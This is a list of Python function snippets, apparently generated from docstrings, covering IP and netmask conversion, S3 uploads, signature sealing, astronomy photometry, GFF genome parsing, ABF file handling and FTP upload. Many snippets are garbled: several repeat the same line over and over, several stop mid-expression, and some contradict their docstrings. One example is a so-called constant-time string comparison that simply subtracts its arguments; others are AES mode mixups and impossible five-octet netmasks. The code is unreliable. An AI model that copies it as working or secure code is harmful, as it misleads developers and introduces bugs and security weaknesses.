        "def _bits_to_decimal(bits, precision):\n    \"\"\"Bits to decimal conversion.\"\"\"\n    if bits < 0:\n        raise ValueError(\"Negative number of bits\")\n    if precision < 0:\n        raise ValueError(\"Negative precision\")\n    if precision == 0:\n        return bits\n    return bits // (1 << precision)",
        "def _wildcard_to_decimal(self, value):\n        \"\"\"Wildcard bits to decimal conversion.\"\"\"\n        if value is None:\n            return None\n        if value.is_wildcard:\n            return value.value\n        return Decimal(value.value)",
        "def _detect_ip(ip):\n    \"\"\"\n    Function internally used to detect the notation of the\n    given IP or netmask.\n    \"\"\"\n    if ip is None:\n        return None\n    if isinstance(ip, str):\n        ip = ip.lower()\n    if ip.startswith('0x'):\n        ip = ip[2:]\n    if ip.startswith('0.'):\n        ip = ip[1:]\n    if ip.startswith('0x'):\n        ip = ip[2:]\n    if ip.startswith('0x0'):\n        ip = ip[0]\n    if ip.startswith('0x0.'):\n        ip = ip[0]\n    if ip.startswith('0x0'):\n        ip = ip[0]\n    if ip.startswith('0x0.'):\n        ip",
        "def _ip_to_netmask(ip_address, netmask_address):\n    \"\"\"Internally used to convert IPs and netmasks to other notations.\"\"\"\n    if netmask_address is None:\n        return ip_address\n    if isinstance(netmask_address, six.string_types):\n        netmask_address = ipaddress.ip_network(netmask_address)\n    return netmask_address",
        "def ip_to_notation(ip, notation=IP_DOT, inotation=None, check=True):\n    \"\"\"Convert among IP address notations.\n\n    Given an IP address, this function returns the address\n    in another notation.\n\n    @param ip: the IP address.\n    @type ip: integers, strings or object with an appropriate __str()__ method.\n\n    @param notation: the notation of the output (default: IP_DOT).\n    @type notation: one of the IP_* constants, or the equivalent strings.\n\n    @param inotation: force the input to be considered in the given notation\n                    (default the notation of the input is autodetected).\n    @type inotation: one of the IP_* constants, or the equivalent strings.\n\n    @param check: force the notation check on the input.\n    @type check",
        "def netmask_to_notation(netmask):\n    \"\"\"Convert a netmask to another notation.\"\"\"\n    if netmask is None:\n        return None\n    if netmask == '0':\n        return '0.0.0.0'\n    if netmask == '255':\n        return '255.255.255.255'\n    if netmask == '255.255.255.255':\n        return '255.255.255.255'\n    if netmask == '255.255.255.255.255':\n        return '255.255.255.255.255'\n    if netmask == '255.255.255.255.255.255':\n        return '255.255.255.255.255.255'\n    if netmask == '255.255.255.255.255.255':\n        return '255.255.255.255.255.255'\n    if",
        "def ip_sum(ip1, ip2):\n    \"\"\"Sum two IP addresses.\"\"\"\n    if ip1 is None or ip2 is None:\n        return None\n    return ip_sum_all(ip1, ip2)",
        "def ip_subtract(ip1, ip2):\n    \"\"\"Subtract two IP addresses.\"\"\"\n    if ip1 == ip2:\n        return ip1\n    if ip1.version == 4 and ip2.version == 4:\n        return ip_subtract_4(ip1, ip2)\n    if ip1.version == 6 and ip2.version == 6:\n        return ip_subtract_6(ip1, ip2)\n    raise ValueError(\"Invalid IP addresses\")",
        "def _netmask_to_bits(netmask):\n    \"\"\"Return the bits notation of the netmask.\"\"\"\n    if netmask is None:\n        return None\n    if netmask.startswith('0x'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask[2:]\n    if netmask.startswith('0x0'):\n        netmask = netmask",
        "def _get_wildcard_bits(netmask):\n    \"\"\"Return the wildcard bits notation of the netmask.\"\"\"\n    if netmask.version == 4:\n        return netmask.get_wildcard_bits(4)\n    elif netmask.version == 6:\n        return netmask.get_wildcard_bits(6)\n    else:\n        raise ValueError(\"Unknown netmask version %s\" % netmask.version)",
        "def set_ip(self, ip, netmask):\n        \"\"\"Set the IP address and the netmask.\"\"\"\n        self.ip = ip\n        self.netmask = netmask",
        "def change_ip(self, ip):\n        \"\"\"Change the current IP.\"\"\"\n        self.ip = ip\n        self.update_ip()",
        "def netmask(self, netmask):\n        \"\"\"Change the current netmask.\"\"\"\n        if netmask is None:\n            netmask = self.netmask\n        self._netmask = netmask\n        self.send_command(b'netmask %s' % netmask)",
        "def is_usable(self, address, cidr):\n        \"\"\"\n        Return true if the given address in amongst the usable addresses,\n        or if the given CIDR is contained in this one.\n        \"\"\"\n        if cidr in self.usable:\n            return True\n        if self.is_unusable(address):\n            return False\n        if self.is_unreachable(address):\n            return False\n        if self.is_unreachable_cidr(cidr):\n            return False\n        if self.is_unreachable_ip(address):\n            return False\n        if self.is_unreachable_ip_cidr(cidr):\n            return False\n        if self.is_unreachable_ip_any(address):\n            return False\n        return True",
        "def upload_file(self, key, file_path, bucket, region, key_type,\n                    key_size, key_name, content_type,\n                    content_encoding, content_disposition,\n                    content_language, content_md5, content_sha1,\n                    content_range, content_type_options,\n                    content_disposition_options,\n                    content_language_options,\n                    content_md5_options, content_sha1_options,\n                    content_range_options, content_type_options,\n                    content_disposition_options,\n                    content_language_options,\n                    content_md5_options, content_sha1_options,\n                    content_range_options, content_type_options,\n                    content_disposition_options,\n                    content_language_options,\n                    content_md5_options, content_sha1_options,\n",
        "def copy_file(self, src_bucket, src_key, dst_bucket, dst_key):\n        \"\"\"Copy a file from one bucket into another\"\"\"\n        self.s3.copy_object(\n            Bucket=src_bucket,\n            Key=src_key,\n            DestinationBucket=dst_bucket,\n            DestinationKey=dst_key,\n        )",
        "def upload_folder(self, bucket, folder, key=None, skip=None,\n                     content_types=None):\n        \"\"\"\n        Recursively upload a ``folder`` into a backet.\n\n        :param bucket: bucket where to upload the folder to\n        :param folder: the folder location in the local file system\n        :param key: Optional key where the folder is uploaded\n        :param skip: Optional list of files to skip\n        :param content_types: Optional dictionary mapping suffixes to\n            content types\n        :return: a coroutine\n        \"\"\"\n        if not os.path.isdir(folder):\n            raise ValueError('Invalid folder: %s' % folder)\n\n        if key is None:\n            key = os.path.basename(folder)\n\n        if content_types is None:\n            content_types = {}\n\n        if not skip:\n            skip =",
        "def upload_file(self, file_path, file_name, content_type,\n                     content_encoding, content_disposition,\n                     content_length, content_type_options=None):\n        \"\"\"Coroutine for uploading a single file\"\"\"\n        if content_type_options is None:\n            content_type_options = {}\n        if content_type_options.get('filename', None) is None:\n            content_type_options['filename'] = file_name\n        if content_type_options.get('content_type', None) is None:\n            content_type_options['content_type'] = content_type\n        if content_type_options.get('content_disposition', None) is None:\n            content_type_options['content_disposition'] = content_disposition\n        if content_type_options.get('content_length', None) is None:",
        "def trigger(self, event):\n        \"\"\"Trigger an ``event`` on this channel\"\"\"\n        if not self.is_open:\n            raise ChannelNotOpenError(\"Channel is not open\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"Channel is not connected\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"Channel is not connected\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"Channel is not connected\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"Channel is not connected\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"Channel is not connected\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"Channel is not connected\")\n        if not self.is_connected:\n            raise ChannelNotConnectedError(\"",
        "def connect(self, url, username, password):\n        \"\"\"Connect to a Pusher websocket\"\"\"\n        self.ws = websockets.WebSocketApp(url, username, password)\n        self.ws.on_message = self.on_message\n        self.ws.on_close = self.on_close",
        "def _handle_message(self, message):\n        \"\"\"Handle websocket incoming messages\"\"\"\n        if message.type == 'message':\n            if message.data.get('type') == 'message':\n                self._handle_message_data(message.data)\n            else:\n                self._handle_message_raw(message.data)\n        else:\n            self._handle_message_raw(message.data)",
        "def _cmp_time(a, b):\n    \"\"\"Constant time string comparison\"\"\"\n    if a is None or b is None:\n        return 0\n    return a - b",
        "def html_entities(text):\n    \"\"\"Decodes a limited set of HTML entities.\"\"\"\n    return ''.join(\n        [\n            html_entities_map.get(c, c)\n            for c in text\n        ]\n    )",
        "def set_passphrases(self, passphrase):\n        \"\"\"Set signature passphrases\"\"\"\n        if passphrase is None:\n            passphrase = ''\n        self.passphrases = passphrase",
        "def set_passphrases(self, passphrase):\n        \"\"\"Set encryption passphrases\"\"\"\n        if passphrase is None:\n            passphrase = ''\n        self.passphrases = passphrase",
        "def set_algorithms(self, algorithms):\n        \"\"\"Set algorithms used for sealing. Defaults can not be overridden.\"\"\"\n        if algorithms is None:\n            algorithms = []\n        self._algorithms = algorithms",
        "def get_sealing_algorithms():\n    \"\"\"Get algorithms used for sealing\"\"\"\n    return [\n        'sha1',\n        'sha256',\n        'sha384',\n        'sha512',\n        'sha384-sha512',\n        'sha512-sha384',\n        'sha512-sha512-sha384',\n        'sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        'sha512-sha512-sha512-sha512',\n        '",
        "def _set_sealing_options(self, options):\n        \"\"\"Private function for setting options used for sealing\"\"\"\n        if options.get('sealing_type') == 's3':\n            self.s3_bucket = options.get('s3_bucket')\n            self.s3_key = options.get('s3_key')\n            self.s3_region = options.get('s3_region')\n            self.s3_bucket_region = options.get('s3_bucket_region')\n            self.s3_bucket_name = options.get('s3_bucket_name')\n            self.s3_bucket_path = options.get('s3_bucket_path')\n            self.s3_bucket_region_path = options.get('s3_bucket_region_path')\n            self.s3_",
        "def verify_sealed_data(self, sealed_data):\n        \"\"\"Verify sealed data signature\"\"\"\n        if not sealed_data:\n            return False\n        if not isinstance(sealed_data, bytes):\n            raise TypeError(\"sealed_data must be bytes\")\n        if len(sealed_data) != self.SEALED_DATA_SIGNATURE_LENGTH:\n            raise ValueError(\"sealed_data must be %d bytes long\" % self.SEALED_DATA_SIGNATURE_LENGTH)\n        return self.verify_signature(sealed_data)",
        "def encode(self, data, algorithm):\n        \"\"\"Encode data with specific algorithm\"\"\"\n        if algorithm == 'sha1':\n            return self.encode_sha1(data)\n        elif algorithm == 'sha256':\n            return self.encode_sha256(data)\n        elif algorithm == 'sha384':\n            return self.encode_sha384(data)\n        elif algorithm == 'sha512':\n            return self.encode_sha512(data)\n        else:\n            raise ValueError('Unknown algorithm: %s' % algorithm)",
        "def decode(self, data):\n        \"\"\"Decode data with specific algorithm\"\"\"\n        if self.algorithm == 'aes':\n            return AES.new(self.key, AES.MODE_CFB, self.iv)\n        elif self.algorithm == 'aes128gcm':\n            return AES.new(self.key, AES.MODE_CFB, self.iv, AES.MODE_GCM)\n        elif self.algorithm == 'aes256gcm':\n            return AES.new(self.key, AES.MODE_CFB, self.iv, AES.MODE_GCM)\n        elif self.algorithm == 'aes128gcm128':\n            return AES.new(self.key, AES.MODE_CFB, self.iv, AES.MODE_GCM, AES.MODE_128)\n        elif self.algorithm == 'aes256gcm128':\n            return",
        "def add_signature(self, data, signature):\n        \"\"\"Add signature to data\"\"\"\n        if signature is None:\n            return\n        if isinstance(signature, str):\n            signature = signature.encode('utf-8')\n        data = data + signature\n        return data",
        "def remove_signature(self, signature):\n        \"\"\"Verify and remove signature\"\"\"\n        if signature in self.signatures:\n            self.signatures.remove(signature)\n            self.signature_count -= 1\n            if self.signature_count == 0:\n                self.verify_signature()",
        "def remove_magic(self, magic):\n        \"\"\"Verify and remove magic\"\"\"\n        if magic not in self.magic:\n            raise ValueError(\"Magic '%s' not found\" % magic)\n        del self.magic[magic]",
        "def add_header(self, name, value):\n        \"\"\"Add header to data\"\"\"\n        if name not in self.headers:\n            self.headers[name] = value\n        else:\n            raise ValueError(\"Duplicate header: %s\" % name)",
        "def read_header(self, data):\n        \"\"\"Read header from data\"\"\"\n        self.header = struct.unpack('<BBBB', data[:4])\n        self.version = self.header[0]\n        self.num_channels = self.header[1]\n        self.num_frames = self.header[2]\n        self.num_frames_per_channel = self.header[3]\n        self.num_frames_per_frame = self.header[4]\n        self.num_frames_per_packet = self.header[5]\n        self.num_frames_per_packet_per_channel = self.header[6]\n        self.num_frames_per_packet_per_frame = self.header[7]\n        self.num_frames_per_packet_per_frame_per_packet = self.header[8",
        "def remove_header(self, header):\n        \"\"\"Remove header from data\"\"\"\n        if header in self.headers:\n            del self.headers[header]",
        "def read_header_version(self, data):\n        \"\"\"Read header version from data\"\"\"\n        version = struct.unpack('<I', data[0:4])[0]\n        if version == 0x01:\n            return 0x01\n        elif version == 0x02:\n            return 0x02\n        elif version == 0x03:\n            return 0x03\n        elif version == 0x04:\n            return 0x04\n        elif version == 0x05:\n            return 0x05\n        elif version == 0x06:\n            return 0x06\n        elif version == 0x07:\n            return 0x07\n        elif version == 0x08:\n            return 0x08\n        elif version == 0x09:\n            return 0x09\n        elif version == 0x0a:\n            return 0x0a\n        elif version == 0",
        "def get_algorithm_info(self, algorithm_id):\n        \"\"\"Get algorithm info\"\"\"\n        return self.get_request(\n            endpoint='algorithms/{0}'.format(algorithm_id),\n            method='GET'\n        )",
        "def generate_key(self):\n        \"\"\"Generate and return PBKDF2 key\"\"\"\n        salt = self.generate_salt()\n        key = self.generate_key_bytes(salt)\n        return key",
        "def update_algorithm_types(self):\n        \"\"\"Update algorithm definition type dictionaries\"\"\"\n        for algorithm_type in self.algorithm_types:\n            algorithm_type_id = algorithm_type.get('id')\n            algorithm_type_name = algorithm_type.get('name')\n            algorithm_type_description = algorithm_type.get('description')\n            algorithm_type_description_html = algorithm_type.get('description_html')\n            algorithm_type_description_plain = algorithm_type.get('description_plain')\n            algorithm_type_description_html_plain = algorithm_type.get('description_html_plain')\n            algorithm_type_description_plain = algorithm_type.get('description_plain')\n            algorithm_type_description_plain = algorithm_type.get('description_plain')\n            algorithm_type_description_plain = algorithm_type.get",
        "def _populateTableOfContents(self):\n        \"\"\"This function populates the internal tableOfContents list with the contents\n        of the zip file TOC. If the server does not support ranged requests, this will raise\n        and exception. It will also throw an exception if the TOC cannot be found.\n        \"\"\"\n        # Get the TOC\n        try:\n            toc = self.server.get_file(self.zipFileName)\n        except Exception as e:\n            raise Exception(\"Could not retrieve TOC: \" + str(e))\n\n        # Check if the TOC is a valid zip file\n        if not toc.is_zip():\n            raise Exception(\"Could not retrieve TOC: \" + str(toc))\n\n        # Get the TOC's contents\n        try:\n            tocContents = toc.read()\n        except Exception as e:\n            raise Exception(\"Could not",
        "def extractFile(self, filename):\n        \"\"\"\n        This function will extract a single file from the remote zip without downloading\n        the entire zip file. The filename argument should match whatever is in the 'filename'\n        key of the tableOfContents.\n        \"\"\"\n        # Get the file from the remote zip\n        with zipfile.ZipFile(self.zipFile) as zip:\n            zip.extract(self.zipFile, filename)",
        "def _compute_uncertainties(self):\n        \"\"\"\n        Does photometry and estimates uncertainties by calculating the scatter around a linear fit to the data\n        in each orientation. This function is called by other functions and generally the user will not need\n        to interact with it directly.\n        \"\"\"\n        # Calculate the scatter around a linear fit to the data in each orientation\n        self._scatter_around_fit = self._compute_scatter_around_fit()\n        # Estimate uncertainties\n        self._uncertainties = self._compute_uncertainties()\n        # Update the plot\n        self._plot()",
        "def plot_aperture(self, img):\n        \"\"\"\n        Creates the figure shown in ``adjust_aperture`` for visualization purposes. Called by other functions\n        and generally not called by the user directly.\n\n        Args: \n            img: The data frame to be passed through to be plotted. A cutout of the ``integrated_postcard``\n        \"\"\"\n        fig, ax = plt.subplots(figsize=(8, 6))\n        ax.set_title('Integrated Postcard Aperture')\n        ax.set_xlabel('Time (s)')\n        ax.set_ylabel('Aperture (mA)')\n        ax.set_title_fontsize('large')\n        ax.set_ylabel_fontsize('large')\n        ax.set_xlabel_fontsize('large')\n        ax.set_title_fontsize('large')\n        ax.",
        "def _get_centroid_positions(self, target_star):\n        \"\"\"Identify the centroid positions for the target star at all epochs. Useful for verifying that there is\n        no correlation between flux and position, as might be expected for high proper motion stars.\n        \"\"\"\n        # Find the centroid of the target star at all epochs.\n        centroid_positions = np.zeros(self.n_epochs)\n        for epoch in range(self.n_epochs):\n            # Find the centroid of the target star at epoch.\n            target_flux = self.target_fluxes[epoch]\n            target_position = self.target_positions[epoch]\n            centroid_positions[epoch] = np.mean(target_flux * target_position)\n        return centroid_positions",
        "def _identify_expected_flux(self, obs_time, obs_data):\n        '''Identify the \"expected\" flux value at the time of each observation based on the \n        Kepler long-cadence data, to ensure variations observed are not the effects of a single\n        large starspot. Only works if the target star was targeted for long or short cadence\n        observations during the primary mission.'''\n        # Identify the expected flux value at the time of each observation based on the \n        # Kepler long-cadence data\n        expected_flux = 0.0\n        for k in range(len(obs_data)):\n            if obs_data[k]['long_cadence_flux'] is not None:\n                expected_flux += obs_data[k]['long_cadence_flux']\n        return expected_flux",
        "def _estimate_photometric_uncertainties(self, C, data, photometric_uncertainties,\n                                          photometric_uncertainties_type):\n        \"\"\"\n        Estimate the photometric uncertainties on each data point following Equation A.2 of The Paper.\n        Based on the kepcal package of Dan Foreman-Mackey.\n        \"\"\"\n        if photometric_uncertainties_type == 'log':\n            return self._estimate_log_photometric_uncertainties(C, data, photometric_uncertainties)\n        elif photometric_uncertainties_type == 'log_pdf':\n            return self._estimate_log_pdf_photometric_uncertainties(C, data, photometric_uncertainties)\n        elif photometric_uncertainties_type == 'log_",
        "def _dump_field(self, field, indent, indent_level):\n        \"\"\"Dump single field.\"\"\"\n        if field.is_repeated:\n            self._dump_repeated_field(field, indent, indent_level)\n        else:\n            self._dump_field(field, indent, indent_level)",
        "def disassemble_file(file_path):\n    \"\"\"Disassemble serialized protocol buffers file.\"\"\"\n    with open(file_path, 'rb') as f:\n        return disassemble(f)",
        "def find_missing_imports(self, pbds):\n        \"\"\"Find all missing imports in list of Pbd instances.\"\"\"\n        missing = []\n        for pbd in pbds:\n            for import_ in pbd.imports:\n                if import_.name not in self.imports:\n                    missing.append(import_)\n        return missing",
        "def fasta_dict_to_file(fasta_dict, fasta_file, line_char_limit=None):\n    \"\"\"\n    Write fasta_dict to fasta_file\n\n    :param fasta_dict: returned by fasta_file_to_dict\n    :param fasta_file: output file can be a string path or a file object\n    :param line_char_limit: None = no limit (default)\n    :return: None\n    \"\"\"\n    if line_char_limit is None:\n        line_char_limit = DEFAULT_LINE_CHAR_LIMIT\n    if isinstance(fasta_file, str):\n        fasta_file = open(fasta_file, 'w')\n    for line in fasta_dict:\n        fasta_file.write(line + '\\n')\n        fasta_file.write('\\n')",
        "def _log_error(self, line_data, error_info, logger, log_level):\n        \"\"\"\n        Helper function to record and log an error message\n\n        :param line_data: dict\n        :param error_info: dict\n        :param logger:\n        :param log_level: int\n        :return:\n        \"\"\"\n        error_message = line_data.get('message')\n        if error_message:\n            logger.error(error_message, **error_info)\n            if log_level >= self.LOG_LEVEL_ERROR:\n                self.log_error_message(error_message, line_data, logger)",
        "def is_child_feature_within_bounds(self):\n        \"\"\"\n        checks whether child features are within the coordinate boundaries of parent features\n\n        :return:\n        \"\"\"\n        if self.parent is None:\n            return False\n        if self.child_features is None:\n            return False\n        return all(self.child_features.is_within_bounds())",
        "def _get_same_parent_cds(self, parent_id, strand):\n        \"\"\"\n        1. get a list of CDS with the same parent\n        2. sort according to strand\n        3. calculate and validate phase\n        \"\"\"\n        parent_cds = self.get_parent_cds(parent_id)\n        if parent_cds is None:\n            return None\n        parent_cds = sorted(parent_cds, key=lambda x: x.strand)\n        if len(parent_cds) == 0:\n            return None\n        if strand == '-':\n            return parent_cds\n        else:\n            return parent_cds[0]",
        "def transfer_children(self, old_parent, new_parent):\n        \"\"\" Transfer children from old_parent to new_parent\n\n        :param old_parent: feature_id(str) or line_index(int) or line_data(dict) or feature\n        :param new_parent: feature_id(str) or line_index(int) or line_data(dict)\n        :return: List of children transferred\n        \"\"\"\n        if isinstance(old_parent, Feature):\n            old_parent_id = old_parent.feature_id\n        elif isinstance(old_parent, str):\n            old_parent_id = old_parent\n        elif isinstance(old_parent, int):\n            old_parent_id = old_parent\n        elif isinstance(old_parent, dict):\n            old_parent_id = old_parent['id']\n        else",
        "def _remove_line_data(self, line_data, root_type):\n        \"\"\"\n        Marks line_data and all of its associated feature's 'line_status' as 'removed', does not actually remove the line_data from the data structure.\n        The write function checks the 'line_status' when writing the gff file.\n        Find the root parent of line_data of type root_type, remove all of its descendants.\n        If the root parent has a parent with no children after the remove, remove the root parent's parent recursively.\n\n        :param line_data:\n        :param root_type:\n        :return:\n        \"\"\"\n        if line_data.get('line_status') == 'removed':\n            if line_data.get('parent_type') == root_type:\n                self._remove_line_data(line_data['parent'], root",
        "def get_abfs_id(filename):\n    \"\"\"given a filename, return the ABFs ID string.\"\"\"\n    if not os.path.exists(filename):\n        raise ValueError(\"File %s does not exist\" % filename)\n    with open(filename, 'rb') as f:\n        return f.read(4)",
        "def _get_protocol(self, record):\n        \"\"\"Determine the protocol used to record an ABF file\"\"\"\n        if record.get('protocol'):\n            return record['protocol']\n        elif record.get('file_type'):\n            return record['file_type']\n        else:\n            return 'unknown'",
        "def make_html(self, header):\n        \"\"\"given the bytestring ABF header, make and launch HTML.\"\"\"\n        self.make_html_header(header)\n        self.make_html_body()\n        self.make_html_footer()",
        "def sweep(self):\n        \"\"\"iterate over every sweep\"\"\"\n        for i in range(self.n_sweep):\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()\n            self.sweep_step()",
        "def read_header(self):\n        \"\"\"read the header and populate self with information about comments\"\"\"\n        self.header = self.read_file(self.filename)\n        self.comments = self.header.get('comments', [])\n        self.comments = [Comment(comment) for comment in self.comments]",
        "def condense_protocol(self, sweep):\n        \"\"\"\n        given a sweep, return the protocol as condensed sequence.\n        This is better for comparing similarities and determining steps.\n        There should be no duplicate numbers.\n        \"\"\"\n        protocol = []\n        for i in range(len(sweep)):\n            protocol.append(self.protocol[i])\n        return protocol",
        "def average(self):\n        \"\"\"return the average of part of the current sweep.\"\"\"\n        if self.total_time is None:\n            return None\n        return self.total_time / self.total_time_sweep",
        "def average_sweep(self, sweeps):\n        \"\"\"\n        Return a sweep which is the average of multiple sweeps.\n        For now, standard deviation is lost.\n        \"\"\"\n        sweeps = list(sweeps)\n        if len(sweeps) == 0:\n            return None\n        if len(sweeps) == 1:\n            return sweeps[0]\n        return np.average(sweeps, axis=0)",
        "def create_kernel(self):\n        \"\"\"create kernel based on this ABF info.\"\"\"\n        kernel = self.create_kernel_from_info()\n        kernel.set_input_data(self.input_data)\n        kernel.set_output_data(self.output_data)\n        kernel.set_kernel_type(self.kernel_type)\n        kernel.set_kernel_name(self.kernel_name)\n        kernel.set_kernel_version(self.kernel_version)\n        kernel.set_kernel_description(self.kernel_description)\n        kernel.set_kernel_source(self.kernel_source)\n        kernel.set_kernel_source_version(self.kernel_source_version)\n        kernel.set_kernel_source_name(self.kernel_source_name)\n        kernel.set_kernel_source_description(self",
        "def get_filtered_sweep_y(self):\n        \"\"\"Get the filtered sweepY of the current sweep.\n        Only works if self.kernel has been generated.\n        \"\"\"\n        if self.kernel is None:\n            return self.sweepY\n        else:\n            return self.kernel.get_filtered_sweep_y()",
        "def _flatten_dicts(dicts):\n    \"\"\"Given a list of list of dicts, return just the dicts.\"\"\"\n    return [d for d in dicts if isinstance(d, dict)]",
        "def get_values(self, key):\n        \"\"\"given a key, return a list of values from the matrix with that key.\"\"\"\n        if key not in self.matrix:\n            raise KeyError(\"Key %s not in matrix\" % key)\n        return [self.matrix[key][i] for i in range(self.matrix[key].shape[0])]",
        "def _recarray_to_dict(recarray):\n    \"\"\"given a recarray, return it as a list of dicts.\"\"\"\n    return [dict(zip(recarray.dtype.names, row)) for row in recarray]",
        "def launch_html(self, text):\n        \"\"\"given text, make it a temporary HTML file and launch it.\"\"\"\n        html_file = tempfile.NamedTemporaryFile(delete=False)\n        html_file.write(text)\n        html_file.close()\n        self.launch_file(html_file.name)",
        "def show_object(self, obj):\n        \"\"\"show everything we can about an object's projects and methods.\"\"\"\n        print(\"{0} {1}\".format(obj.name, obj.type))\n        for p in obj.projects:\n            print(\"{0} {1}\".format(p.name, p.type))\n        for m in obj.methods:\n            print(\"{0} {1}\".format(m.name, m.type))",
        "def _put_data(self, data, filename):\n        \"\"\"Put 2d numpy data into a temporary HTML file.\"\"\"\n        with open(filename, 'w') as f:\n            f.write(self._html_template.format(data=data))",
        "def load_xml(xml_path):\n    \"\"\"given a string or a path to an XML file, return an XML object.\"\"\"\n    if isinstance(xml_path, str):\n        xml_path = os.path.abspath(xml_path)\n    if os.path.isfile(xml_path):\n        with open(xml_path, 'r') as f:\n            return etree.parse(f)\n    else:\n        raise ValueError('XML file %s not found' % xml_path)",
        "def _curve(x, y, z, a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x0, y0, z0, a0, b0, c0, d0, e0, f0, g0, h0, i0, j0, k0, l0, m0, n0, o0, p0, q0, r0, s0, t0, u0, v0, w0):\n    \"\"\"mono-exponential curve.\"\"\"\n    x = x + 1\n    y = y + 1\n    z = z + 1\n    a = a + 1\n    b = b + 1\n    c = c + 1\n    d = d + 1\n    e = e +",
        "def cross_above_threshold(self, threshold):\n        \"\"\"return a list of Is where the data first crosses above threshold.\"\"\"\n        return [Is(self.data[i].cross(self.data[j].cross(threshold)),\n                Is(self.data[j].cross(self.data[i].cross(threshold)),\n                Is(self.data[i].cross(self.data[j].cross(threshold)),\n                Is(self.data[i].cross(self.data[j].cross(threshold)),\n                Is(self.data[j].cross(self.data[i].cross(threshold)),\n                Is(self.data[i].cross(self.data[j].cross(threshold)),\n                Is(self.data[i].cross(self.data[j].cross(threshold)),\n                Is(self.data",
        "def _format_2d_matrix(self, matrix):\n        \"\"\"Try to format anything as a 2D matrix with column names.\"\"\"\n        if matrix.shape[1] != 2:\n            raise ValueError(\"Expected 2D matrix, got %s\" % matrix.shape)\n        return self._format_2d_array(matrix)",
        "def save(self, filename):\n        \"\"\"save something to a pickle file\"\"\"\n        with open(filename, 'wb') as f:\n            pickle.dump(self, f)",
        "def _dict_to_string(d):\n    \"\"\"convert a dictionary to a pretty formatted string.\"\"\"\n    s = []\n    for k, v in d.items():\n        s.append(k + \": \" + _dict_to_string(v))\n    return \"\\n\".join(s)",
        "def _get_comment(self, line):\n        \"\"\"determine the comment cooked in the protocol.\"\"\"\n        if line.startswith('#'):\n            return line[1:]\n        else:\n            return line",
        "def scan_abf_subdir(abf_dir, sub_dir):\n    \"\"\"scan an ABF directory and subdirectory. Try to do this just once.\n    Returns ABF files, SWHLab files, and groups.\n    \"\"\"\n    abf_files = []\n    swhlab_files = []\n    groups = []\n    for root, dirs, files in os.walk(abf_dir):\n        for f in files:\n            if f.endswith(\".swhlab\"):\n                swhlab_files.append(os.path.join(root, f))\n            elif f.endswith(\".abf\"):\n                abf_files.append(os.path.join(root, f))\n            elif f.endswith(\".abf.gz\"):\n                abf_files.append(os.path.join(root",
        "def get_parent_abf(abf_file):\n    \"\"\"given an ABF file name, return the ABF of its parent.\"\"\"\n    parent_abf = None\n    for abf in get_abfs():\n        if abf.name == abf_file:\n            parent_abf = abf\n            break\n    return parent_abf",
        "def get_parent_id(abf, groups):\n    \"\"\"given an ABF and the groups dict, return the ID of its parent.\"\"\"\n    for g in groups:\n        if g.get('parent_id'):\n            return g['parent_id']\n    return None",
        "def get_parent_line(abf, parent_id):\n    \"\"\"given an ABF, find the parent, return that line of experiments.txt\"\"\"\n    parent_line = abf.get_line(parent_id)\n    if parent_line is None:\n        return None\n    return parent_line.split('\\t')[0].strip()",
        "def get_abf_ids(files):\n    \"\"\"\n    given a path or list of files, return ABF IDs.\n    \"\"\"\n    if isinstance(files, str):\n        files = [files]\n    return [get_abf_id(f) for f in files]",
        "def _get_abf_or_filename(abf_or_filename):\n    \"\"\"May be given an ABF object or filename.\"\"\"\n    if isinstance(abf_or_filename, ABF):\n        return abf_or_filename\n    elif isinstance(abf_or_filename, str):\n        return ABF(abf_or_filename)\n    else:\n        raise ValueError(\"Invalid ABF object or filename: %s\" % abf_or_filename)",
        "def ftp(self):\n        \"\"\"return an \"FTP\" object after logging in.\"\"\"\n        if self._ftp is None:\n            self._ftp = FTP(self.host, self.port, self.user, self.password)\n        return self._ftp",
        "def upload(self, localFolder):\n        \"\"\"\n        upload everything from localFolder into the current FTP folder.\n        \"\"\"\n        if not os.path.exists(localFolder):\n            raise Exception(\"Local folder does not exist: %s\" % localFolder)\n        if not os.path.isdir(localFolder):\n            raise Exception(\"Local folder is not a directory: %s\" % localFolder)\n        if not os.path.exists(self.folder):\n            os.makedirs(self.folder)\n        for root, dirs, files in os.walk(localFolder):\n            for f in files:\n                if f.endswith(\".py\"):\n                    continue\n                if f.endswith(\".pyc\"):\n                    continue\n                if f.endswith(\".pyo\"):\n                    continue\n                if f.endswith(\".pyw",
        "def upload_version(self, version):\n        \"\"\"Only scott should do this. Upload new version to site.\"\"\"\n        if not self.scott_version:\n            raise ScottError('Scott is not installed')\n        if not self.scott_version.is_scott:\n            raise ScottError('Scott is not installed')\n        if not self.scott_version.is_scott_version:\n            raise ScottError('Scott is not installed')\n        if not self.scott_version.is_scott_version_newer_than(version):\n            raise ScottError('Scott is not installed')\n        self.scott_version.upload_version(version)",
        "def ask_string(self, text, default=None):\n        \"\"\" use the GUI to ask for a string. \"\"\"\n        if default is None:\n            default = self.default_string\n        return self.gui.ask_string(text, default)",
